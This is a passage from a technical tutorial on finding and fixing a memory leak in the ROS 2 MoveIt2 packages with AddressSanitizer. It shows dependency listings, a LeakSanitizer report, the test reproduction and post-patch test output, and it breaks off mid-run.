    <p>Interesting! That’s a bunch of errors in a rather small amount of code. Let’s look at the relationship of the packages (often we want to start fixing bugs of packages with less dependencies so that the overall sanitizing process becomes easier):</p>
    <div class="sourceCode" id="cb67"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb67-1"><a href="#cb67-1" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> list <span class="at">-g</span> <span class="at">--packages-up-to</span> moveit_core</span>
    <span id="cb67-2"><a href="#cb67-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[0.580s]</span> WARNING:colcon.colcon_core.package_selection:the <span class="at">--packages-skip-regex</span> ament.<span class="pp">*</span> doesnt match any of the package names</span>
    <span id="cb67-3"><a href="#cb67-3" aria-hidden="true" tabindex="-1"></a><span class="ex">angles</span>                   +              <span class="pp">*</span></span>
    <span id="cb67-4"><a href="#cb67-4" aria-hidden="true" tabindex="-1"></a><span class="ex">eigen_stl_containers</span>      +            <span class="pp">**</span></span>
    <span id="cb67-5"><a href="#cb67-5" aria-hidden="true" tabindex="-1"></a><span class="ex">joint_state_publisher</span>      +        <span class="pp">*</span>   .</span>
    <span id="cb67-6"><a href="#cb67-6" aria-hidden="true" tabindex="-1"></a><span class="ex">libcurl_vendor</span>              +        <span class="pp">*</span> ..</span>
    <span id="cb67-7"><a href="#cb67-7" aria-hidden="true" tabindex="-1"></a><span class="ex">object_recognition_msgs</span>      +     <span class="pp">*</span>    .</span>
    <span id="cb67-8"><a href="#cb67-8" aria-hidden="true" tabindex="-1"></a><span class="ex">octomap</span>                       +        <span class="pp">**</span></span>
    <span id="cb67-9"><a href="#cb67-9" aria-hidden="true" tabindex="-1"></a><span class="ex">octomap_msgs</span>                   +   <span class="pp">*</span>    <span class="pp">*</span></span>
    <span id="cb67-10"><a href="#cb67-10" aria-hidden="true" tabindex="-1"></a><span class="ex">random_numbers</span>                  +      <span class="pp">**</span></span>
    <span id="cb67-11"><a href="#cb67-11" aria-hidden="true" tabindex="-1"></a><span class="ex">tf2_kdl</span>                          +      <span class="pp">*</span></span>
    <span id="cb67-12"><a href="#cb67-12" aria-hidden="true" tabindex="-1"></a><span class="ex">urdfdom_py</span>                        +   <span class="pp">*</span> .</span>
    <span id="cb67-13"><a href="#cb67-13" aria-hidden="true" tabindex="-1"></a><span class="ex">moveit_msgs</span>                        +    <span class="pp">*</span></span>
    <span id="cb67-14"><a href="#cb67-14" aria-hidden="true" tabindex="-1"></a><span class="ex">moveit_resources</span>                    +   <span class="pp">*</span></span>
    <span id="cb67-15"><a href="#cb67-15" aria-hidden="true" tabindex="-1"></a><span class="ex">resource_retriever</span>                   + <span class="pp">*</span>.</span>
    <span id="cb67-16"><a href="#cb67-16" aria-hidden="true" tabindex="-1"></a><span class="ex">srdfdom</span>                               + <span class="pp">*</span></span>
    <span id="cb67-17"><a href="#cb67-17" aria-hidden="true" tabindex="-1"></a><span class="ex">geometric_shapes</span>                       +<span class="pp">*</span></span>
    <span id="cb67-18"><a href="#cb67-18" aria-hidden="true" tabindex="-1"></a><span class="ex">moveit_core</span>                             +</span></code></pre></div>
    <p>This translates as follows[2]:</p>
    <p><img src="images/2019/deps2_.png" /></p>
    <div class="sourceCode" id="cb68"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb68-1"><a href="#cb68-1" aria-hidden="true" tabindex="-1"></a><span class="co"># made with:</span></span>
    <span id="cb68-2"><a href="#cb68-2" aria-hidden="true" tabindex="-1"></a><span class="ex">apt-get</span> install ros-dashing-qt-dotgraph</span>
    <span id="cb68-3"><a href="#cb68-3" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> list <span class="at">--packages-up-to</span> moveit_core <span class="at">--topological-graph-dot</span> <span class="kw">|</span> <span class="ex">dot</span> <span class="at">-Tpng</span> <span class="at">-o</span> deps.png</span></code></pre></div>
    <p>Both, <code>geometric_shapes</code> and <code>moveit_core</code> depend on quite a few other packages so one would probably pick <code>octomap</code> for starters and try fixing that bug first scaliting into other packages.</p>
    <h4 id="fixing-bugs">Fixing bugs</h4>
    <p>As per the original <a href="https://gist.github.com/vmayoral/25b3cff2c954b099eeb4d1471c1830e2">report</a> the <code>moveit_core</code> related bug detected by ASan is listed below:</p>
    <div class="sourceCode" id="cb69"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb69-1"><a href="#cb69-1" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span> ==36756==ERROR: LeakSanitizer: detected memory leaks</span>
    <span id="cb69-2"><a href="#cb69-2" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span></span>
    <span id="cb69-3"><a href="#cb69-3" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span> Direct leak of 40 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="er">in</span> <span class="ex">1</span> object<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">allocated</span> from:</span>
    <span id="cb69-4"><a href="#cb69-4" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#0 0x7fcbf6a7b458 in operator new(unsigned long) (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xe0458)</span></span>
    <span id="cb69-5"><a href="#cb69-5" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#1 0x7fcbf5d0c0fd in shapes::constructShapeFromText(std::istream&amp;) /opt/ros2_moveit2_ws/src/geometric_shapes/src/shape_operations.cpp:505</span></span>
    <span id="cb69-6"><a href="#cb69-6" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#2 0x7fcbf6641561 in planning_scene::PlanningScene::loadGeometryFromStream(std::istream&amp;, Eigen::Transform&lt;double, 3, 1, 0&gt; const&amp;) /opt/ros2_moveit2_ws/src/moveit2/moveit_core/planning_scene/src/planning_scene.cpp:1077</span></span>
    <span id="cb69-7"><a href="#cb69-7" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#3 0x7fcbf6640336 in planning_scene::PlanningScene::loadGeometryFromStream(std::istream&amp;) /opt/ros2_moveit2_ws/src/moveit2/moveit_core/planning_scene/src/planning_scene.cpp:1043</span></span>
    <span id="cb69-8"><a href="#cb69-8" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#4 0x562e70b1ea9d in PlanningScene_loadBadSceneGeometry_Test::TestBody() /opt/ros2_moveit2_ws/src/moveit2/moveit_core/planning_scene/test/test_planning_scene.cpp:223</span></span>
    <span id="cb69-9"><a href="#cb69-9" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#5 0x562e70ba7039 in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2447</span></span>
    <span id="cb69-10"><a href="#cb69-10" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#6 0x562e70b9918d in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2483</span></span>
    <span id="cb69-11"><a href="#cb69-11" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#7 0x562e70b458b5 in testing::Test::Run() /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2522</span></span>
    <span id="cb69-12"><a href="#cb69-12" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#8 0x562e70b46ce0 in testing::TestInfo::Run() /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2703</span></span>
    <span id="cb69-13"><a href="#cb69-13" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#9 0x562e70b47884 in testing::TestCase::Run() /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2825</span></span>
    <span id="cb69-14"><a href="#cb69-14" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#10 0x562e70b62995 in testing::internal::UnitTestImpl::RunAllTests() /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:5216</span></span>
    <span id="cb69-15"><a href="#cb69-15" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#11 0x562e70ba9aec in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2447</span></span>
    <span id="cb69-16"><a href="#cb69-16" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#12 0x562e70b9b456 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2483</span></span>
    <span id="cb69-17"><a href="#cb69-17" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#13 0x562e70b5f729 in testing::UnitTest::Run() /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:4824</span></span>
    <span id="cb69-18"><a href="#cb69-18" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#14 0x562e70b20ba5 in RUN_ALL_TESTS() (/opt/ros2_moveit2_ws/build/moveit_core/planning_scene/test_planning_scene+0x55ba5)</span></span>
    <span id="cb69-19"><a href="#cb69-19" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#15 0x562e70b1f0be in main /opt/ros2_moveit2_ws/src/moveit2/moveit_core/planning_scene/test/test_planning_scene.cpp:229</span></span>
    <span id="cb69-20"><a href="#cb69-20" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span>     <span class="co">#16 0x7fcbf3c66b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)</span></span>
    <span id="cb69-21"><a href="#cb69-21" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span></span>
    <span id="cb69-22"><a href="#cb69-22" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span> SUMMARY: AddressSanitizer: 40 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">leaked</span> in 1 allocation<span class="er">(</span><span class="ex">s</span><span class="kw">)</span><span class="bu">.</span></span>
    <span id="cb69-23"><a href="#cb69-23" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span> <span class="at">--</span> run_test.py: return code 1</span>
    <span id="cb69-24"><a href="#cb69-24" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span> <span class="at">--</span> run_test.py: inject classname prefix into gtest result file <span class="st">&#39;/opt/ros2_moveit2_ws/build/moveit_core/test_results/moveit_core/test_planning_scene.gtest.xml&#39;</span></span>
    <span id="cb69-25"><a href="#cb69-25" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span> <span class="at">--</span> run_test.py: verify result file <span class="st">&#39;/opt/ros2_moveit2_ws/build/moveit_core/test_results/moveit_core/test_planning_scene.gtest.xml&#39;</span></span>
    <span id="cb69-26"><a href="#cb69-26" aria-hidden="true" tabindex="-1"></a><span class="ex">13/17</span> Test <span class="co">#13: test_planning_scene ..............***Failed    3.57 sec</span></span></code></pre></div>
    <p>This can be easily reproduced by launching the corresponding test file:</p>
    <div class="sourceCode" id="cb70"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb70-1"><a href="#cb70-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@bf916bb1a977:/opt/ros2_moveit2_ws#</span> source install/setup.bash</span>
    <span id="cb70-2"><a href="#cb70-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@bf916bb1a977:/opt/ros2_moveit2_ws#</span> build/moveit_core/planning_scene/test_planning_scene</span>
    <span id="cb70-3"><a href="#cb70-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 6 tests from 1 test case.</span>
    <span id="cb70-4"><a href="#cb70-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb70-5"><a href="#cb70-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 6 tests from PlanningScene</span>
    <span id="cb70-6"><a href="#cb70-6" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">PlanningScene.LoadRestore</span></span>
    <span id="cb70-7"><a href="#cb70-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: Loading robot model <span class="st">&#39;pr2&#39;</span>...</span>
    <span id="cb70-8"><a href="#cb70-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: No root/virtual joint specified in SRDF. Assuming fixed joint</span>
    <span id="cb70-9"><a href="#cb70-9" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">PlanningScene.LoadRestore</span> <span class="er">(</span><span class="ex">796</span> ms<span class="kw">)</span></span>
    <span id="cb70-10"><a href="#cb70-10" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">PlanningScene.LoadRestoreDiff</span></span>
    <span id="cb70-11"><a href="#cb70-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: Loading robot model <span class="st">&#39;pr2&#39;</span>...</span>
    <span id="cb70-12"><a href="#cb70-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: No root/virtual joint specified in SRDF. Assuming fixed joint</span>
    <span id="cb70-13"><a href="#cb70-13" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">PlanningScene.LoadRestoreDiff</span> <span class="er">(</span><span class="ex">699</span> ms<span class="kw">)</span></span>
    <span id="cb70-14"><a href="#cb70-14" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">PlanningScene.MakeAttachedDiff</span></span>
    <span id="cb70-15"><a href="#cb70-15" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: Loading robot model <span class="st">&#39;pr2&#39;</span>...</span>
    <span id="cb70-16"><a href="#cb70-16" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: No root/virtual joint specified in SRDF. Assuming fixed joint</span>
    <span id="cb70-17"><a href="#cb70-17" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">PlanningScene.MakeAttachedDiff</span> <span class="er">(</span><span class="ex">697</span> ms<span class="kw">)</span></span>
    <span id="cb70-18"><a href="#cb70-18" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">PlanningScene.isStateValid</span></span>
    <span id="cb70-19"><a href="#cb70-19" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: Loading robot model <span class="st">&#39;pr2&#39;</span>...</span>
    <span id="cb70-20"><a href="#cb70-20" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">PlanningScene.isStateValid</span> <span class="er">(</span><span class="ex">547</span> ms<span class="kw">)</span></span>
    <span id="cb70-21"><a href="#cb70-21" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">PlanningScene.loadGoodSceneGeometry</span></span>
    <span id="cb70-22"><a href="#cb70-22" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: Loading robot model <span class="st">&#39;pr2&#39;</span>...</span>
    <span id="cb70-23"><a href="#cb70-23" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">PlanningScene.loadGoodSceneGeometry</span> <span class="er">(</span><span class="ex">437</span> ms<span class="kw">)</span></span>
    <span id="cb70-24"><a href="#cb70-24" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">PlanningScene.loadBadSceneGeometry</span></span>
    <span id="cb70-25"><a href="#cb70-25" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: Loading robot model <span class="st">&#39;pr2&#39;</span>...</span>
    <span id="cb70-26"><a href="#cb70-26" aria-hidden="true" tabindex="-1"></a><span class="ex">[ERROR]</span> [moveit.planning_scene]: Bad input stream when loading marker in scene geometry</span>
    <span id="cb70-27"><a href="#cb70-27" aria-hidden="true" tabindex="-1"></a><span class="ex">[ERROR]</span> [moveit.planning_scene]: Improperly formatted color in scene geometry file</span>
    <span id="cb70-28"><a href="#cb70-28" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">PlanningScene.loadBadSceneGeometry</span> <span class="er">(</span><span class="ex">466</span> ms<span class="kw">)</span></span>
    <span id="cb70-29"><a href="#cb70-29" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 6 tests from PlanningScene <span class="er">(</span><span class="ex">3643</span> ms total<span class="kw">)</span></span>
    <span id="cb70-30"><a href="#cb70-30" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb70-31"><a href="#cb70-31" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb70-32"><a href="#cb70-32" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 6 tests from 1 test case ran. <span class="er">(</span><span class="ex">3645</span> ms total<span class="kw">)</span></span>
    <span id="cb70-33"><a href="#cb70-33" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">6</span> tests.</span>
    <span id="cb70-34"><a href="#cb70-34" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb70-35"><a href="#cb70-35" aria-hidden="true" tabindex="-1"></a><span class="ex">=================================================================</span></span>
    <span id="cb70-36"><a href="#cb70-36" aria-hidden="true" tabindex="-1"></a><span class="ex">==38461==ERROR:</span> LeakSanitizer: detected memory leaks</span>
    <span id="cb70-37"><a href="#cb70-37" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb70-38"><a href="#cb70-38" aria-hidden="true" tabindex="-1"></a><span class="ex">Direct</span> leak of 40 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="er">in</span> <span class="ex">1</span> object<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">allocated</span> from:</span>
    <span id="cb70-39"><a href="#cb70-39" aria-hidden="true" tabindex="-1"></a>    <span class="co">#0 0x7f9a7e0b7458 in operator new(unsigned long) (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xe0458)</span></span>
    <span id="cb70-40"><a href="#cb70-40" aria-hidden="true" tabindex="-1"></a>    <span class="co">#1 0x7f9a7d3480fd in shapes::constructShapeFromText(std::istream&amp;) /opt/ros2_moveit2_ws/src/geometric_shapes/src/shape_operations.cpp:505</span></span>
    <span id="cb70-41"><a href="#cb70-41" aria-hidden="true" tabindex="-1"></a>    <span class="co">#2 0x7f9a7dc7d561 in planning_scene::PlanningScene::loadGeometryFromStream(std::istream&amp;, Eigen::Transform&lt;double, 3, 1, 0&gt; const&amp;) /opt/ros2_moveit2_ws/src/moveit2/moveit_core/planning_scene/src/planning_scene.cpp:1077</span></span>
    <span id="cb70-42"><a href="#cb70-42" aria-hidden="true" tabindex="-1"></a>    <span class="co">#3 0x7f9a7dc7c336 in planning_scene::PlanningScene::loadGeometryFromStream(std::istream&amp;) /opt/ros2_moveit2_ws/src/moveit2/moveit_core/planning_scene/src/planning_scene.cpp:1043</span></span>
    <span id="cb70-43"><a href="#cb70-43" aria-hidden="true" tabindex="-1"></a>    <span class="co">#4 0x555a087ffa9d in PlanningScene_loadBadSceneGeometry_Test::TestBody() /opt/ros2_moveit2_ws/src/moveit2/moveit_core/planning_scene/test/test_planning_scene.cpp:223</span></span>
    <span id="cb70-44"><a href="#cb70-44" aria-hidden="true" tabindex="-1"></a>    <span class="co">#5 0x555a08888039 in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2447</span></span>
    <span id="cb70-45"><a href="#cb70-45" aria-hidden="true" tabindex="-1"></a>    <span class="co">#6 0x555a0887a18d in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2483</span></span>
    <span id="cb70-46"><a href="#cb70-46" aria-hidden="true" tabindex="-1"></a>    <span class="co">#7 0x555a088268b5 in testing::Test::Run() /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2522</span></span>
    <span id="cb70-47"><a href="#cb70-47" aria-hidden="true" tabindex="-1"></a>    <span class="co">#8 0x555a08827ce0 in testing::TestInfo::Run() /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2703</span></span>
    <span id="cb70-48"><a href="#cb70-48" aria-hidden="true" tabindex="-1"></a>    <span class="co">#9 0x555a08828884 in testing::TestCase::Run() /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2825</span></span>
    <span id="cb70-49"><a href="#cb70-49" aria-hidden="true" tabindex="-1"></a>    <span class="co">#10 0x555a08843995 in testing::internal::UnitTestImpl::RunAllTests() /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:5216</span></span>
    <span id="cb70-50"><a href="#cb70-50" aria-hidden="true" tabindex="-1"></a>    <span class="co">#11 0x555a0888aaec in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2447</span></span>
    <span id="cb70-51"><a href="#cb70-51" aria-hidden="true" tabindex="-1"></a>    <span class="co">#12 0x555a0887c456 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:2483</span></span>
    <span id="cb70-52"><a href="#cb70-52" aria-hidden="true" tabindex="-1"></a>    <span class="co">#13 0x555a08840729 in testing::UnitTest::Run() /opt/ros/dashing/src/gtest_vendor/./src/gtest.cc:4824</span></span>
    <span id="cb70-53"><a href="#cb70-53" aria-hidden="true" tabindex="-1"></a>    <span class="co">#14 0x555a08801ba5 in RUN_ALL_TESTS() (/opt/ros2_moveit2_ws/build/moveit_core/planning_scene/test_planning_scene+0x55ba5)</span></span>
    <span id="cb70-54"><a href="#cb70-54" aria-hidden="true" tabindex="-1"></a>    <span class="co">#15 0x555a088000be in main /opt/ros2_moveit2_ws/src/moveit2/moveit_core/planning_scene/test/test_planning_scene.cpp:229</span></span>
    <span id="cb70-55"><a href="#cb70-55" aria-hidden="true" tabindex="-1"></a>    <span class="co">#16 0x7f9a7b2a2b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)</span></span>
    <span id="cb70-56"><a href="#cb70-56" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb70-57"><a href="#cb70-57" aria-hidden="true" tabindex="-1"></a><span class="ex">SUMMARY:</span> AddressSanitizer: 40 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">leaked</span> in 1 allocation<span class="er">(</span><span class="ex">s</span><span class="kw">)</span><span class="bu">.</span></span></code></pre></div>
    <p>The bug is patched by https://github.com/AcutronicRobotics/moveit2/pull/113. After having patched the bug:</p>
    <div class="sourceCode" id="cb71"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb71-1"><a href="#cb71-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@bf916bb1a977:/opt/ros2_moveit2_ws#</span> build-asan/moveit_core/planning_scene/test_planning_scene</span>
    <span id="cb71-2"><a href="#cb71-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 6 tests from 1 test case.</span>
    <span id="cb71-3"><a href="#cb71-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb71-4"><a href="#cb71-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 6 tests from PlanningScene</span>
    <span id="cb71-5"><a href="#cb71-5" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">PlanningScene.LoadRestore</span></span>
    <span id="cb71-6"><a href="#cb71-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: Loading robot model <span class="st">&#39;pr2&#39;</span>...</span>
    <span id="cb71-7"><a href="#cb71-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: No root/virtual joint specified in SRDF. Assuming fixed joint</span>
    <span id="cb71-8"><a href="#cb71-8" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">PlanningScene.LoadRestore</span> <span class="er">(</span><span class="ex">601</span> ms<span class="kw">)</span></span>
    <span id="cb71-9"><a href="#cb71-9" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">PlanningScene.LoadRestoreDiff</span></span>
    <span id="cb71-10"><a href="#cb71-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: Loading robot model <span class="st">&#39;pr2&#39;</span>...</span>
    <span id="cb71-11"><a href="#cb71-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: No root/virtual joint specified in SRDF. Assuming fixed joint</span>
    <span id="cb71-12"><a href="#cb71-12" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">PlanningScene.LoadRestoreDiff</span> <span class="er">(</span><span class="ex">535</span> ms<span class="kw">)</span></span>
    <span id="cb71-13"><a href="#cb71-13" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">PlanningScene.MakeAttachedDiff</span></span>
    <span id="cb71-14"><a href="#cb71-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: Loading robot model <span class="st">&#39;pr2&#39;</span>...</span>
    <span id="cb71-15"><a href="#cb71-15" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: No root/virtual joint specified in SRDF. Assuming fixed joint</span>
    <span id="cb71-16"><a href="#cb71-16" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">PlanningScene.MakeAttachedDiff</span> <span class="er">(</span><span class="ex">526</span> ms<span class="kw">)</span></span>
    <span id="cb71-17"><a href="#cb71-17" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">PlanningScene.isStateValid</span></span>
    <span id="cb71-18"><a href="#cb71-18" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: Loading robot model <span class="st">&#39;pr2&#39;</span>...</span>
    <span id="cb71-19"><a href="#cb71-19" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">PlanningScene.isStateValid</span> <span class="er">(</span><span class="ex">465</span> ms<span class="kw">)</span></span>
    <span id="cb71-20"><a href="#cb71-20" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">PlanningScene.loadGoodSceneGeometry</span></span>
    <span id="cb71-21"><a href="#cb71-21" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: Loading robot model <span class="st">&#39;pr2&#39;</span>...</span>
    <span id="cb71-22"><a href="#cb71-22" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">PlanningScene.loadGoodSceneGeometry</span> <span class="er">(</span><span class="ex">431</span> ms<span class="kw">)</span></span>
    <span id="cb71-23"><a href="#cb71-23" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">PlanningScene.loadBadSceneGeometry</span></span>
    <span id="cb71-24"><a href="#cb71-24" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> [robot_model]: Loading robot model <span class="st">&#39;pr2&#39;</span>...</span>
    <span id="cb71-25"><a href="#cb71-25" aria-hidden="true" tabindex="-1"></a><span class="ex">[ERROR]</span> [moveit.planning_scene]: Bad input stream when loading marker in scene geometry</span>
    <span id="cb71-26"><a href="#cb71-26" aria-hidden="true" tabindex="-1"></a><span class="ex">[ERROR]</span> [moveit.planning_scene]: Improperly formatted color in scene geometry file</span>
    <span id="cb71-27"><a href="#cb71-27" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">PlanningScene.loadBadSceneGeometry</span> <span class="er">(</span><span class="ex">425</span> ms<span class="kw">)</span></span>
    <span id="cb71-28"><a href="#cb71-28" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 6 tests from PlanningScene <span class="er">(</span><span class="ex">2984</span> ms total<span class="kw">)</span></span>
    <span id="cb71-29"><a href="#cb71-29" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb71-30"><a href="#cb71-30" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
